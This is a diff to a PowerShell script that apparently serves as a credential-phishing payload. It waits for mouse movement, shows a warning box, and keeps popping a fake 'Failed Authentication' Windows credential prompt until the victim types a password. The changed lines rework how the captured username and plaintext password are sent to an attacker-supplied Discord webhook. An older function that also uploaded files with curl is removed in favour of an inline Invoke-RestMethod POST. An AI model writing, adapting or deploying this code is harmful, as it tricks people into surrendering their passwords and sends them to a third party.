@@ -1,4 +1,3 @@
-
 # ----------------- PAUSE TILL MOUSE !
 
 Add-Type -AssemblyName System.Windows.Forms
@@ -35,9 +34,8 @@ $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
 
-# ----------------- PROMPT CREDENTIALS !
-
-    $form = $null
+# ----------------- PROMPT FOR CREDENTIALS !
+ $form = $null
     while ($form -eq $null)
     {
         $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
@@ -57,6 +55,7 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
             $form = $null
         }
         else{
+	    $creds = $cred.GetNetworkCredential() | fl
             $userlogin = $cred.username
 	    $passlogin = $cred.GetNetworkCredential().password
         }
@@ -66,25 +65,16 @@ $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgIm
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-function Upload-Discord {
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-$hookurl = "$dc"
-$Body = @{
-  'username' = $env:username
-  'content' = $text
+if (-not ([string]::IsNullOrEmpty($dc))){
+  $hookurl = "$dc"
+  $Body = @{
+    'username' = $env:username
+    'content' = "user: $userlogin - pass: $passlogin"
+  }
+  if (-not ([string]::IsNullOrEmpty($text))) {
+     Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+  }
 }
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "user:$userlogin - pass:$passlogin"}
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
